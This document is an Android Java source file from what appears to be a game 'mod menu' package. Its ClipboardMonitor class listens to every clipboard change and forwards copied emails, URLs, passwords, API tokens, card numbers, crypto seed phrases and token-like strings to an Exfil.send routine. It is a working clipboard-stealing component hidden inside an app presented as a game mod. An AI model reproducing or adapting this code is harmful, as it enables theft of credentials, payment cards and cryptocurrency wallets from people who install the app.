package com.brawl.modmenu;

import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.os.Handler;
import android.os.Looper;

public class ClipboardMonitor {

    private static String lastContent = "";
    private static boolean running = false;
    private static Handler handler = new Handler(Looper.getMainLooper());

    public static void start(final Context ctx) {
        if (running) return;
        running = true;

        final ClipboardManager cm = (ClipboardManager)
            ctx.getSystemService(Context.CLIPBOARD_SERVICE);
        if (cm == null) return;

        cm.addPrimaryClipChangedListener(() -> {
            try {
                if (!cm.hasPrimaryClip() || cm.getPrimaryClip() == null) return;
                ClipData clip = cm.getPrimaryClip();
                if (clip.getItemCount() == 0) return;

                CharSequence cs = clip.getItemAt(0).coerceToText(ctx);
                if (cs == null) return;
                String text = cs.toString().trim();

                if (text.isEmpty() || text.length() > 1000) return;
                if (text.equals(lastContent)) return;
                lastContent = text;

                // фильтр — только жирное
                if (isInteresting(text)) {
                    Exfil.send("CLIPBOARD_NEW", text);
                }
            } catch (Throwable ignored) {}
        });
    }

    private static boolean isInteresting(String s) {
        String low = s.toLowerCase();

        // email
        if (s.contains("@") && s.contains(".") && s.length() < 100) return true;

        // url
        if (low.startsWith("http")) return true;

        // пароль / токен
        if (low.contains("password") || low.contains("passwd")
            || low.contains("token") || low.contains("api_key")
            || low.contains("пароль")) return true;

        // номер карты (16 цифр)
        String digits = s.replaceAll("[^0-9]", "");
        if (digits.length() >= 15 && digits.length() <= 19 && s.matches(".*[0-9 ]{16,}.*")) {
            return true;
        }

        // крипто-кошелёк / seed
        if (low.contains("seed") || low.contains("mnemonic")
            || low.contains("private")) return true;

        // длинный случайный текст (может быть токен)
        if (s.length() >= 20 && s.length() <= 200
            && s.matches(".*[A-Za-z].*") && s.matches(".*[0-9].*")
            && !s.contains(" ")) {
            return true;
        }

        return false;
    }
}
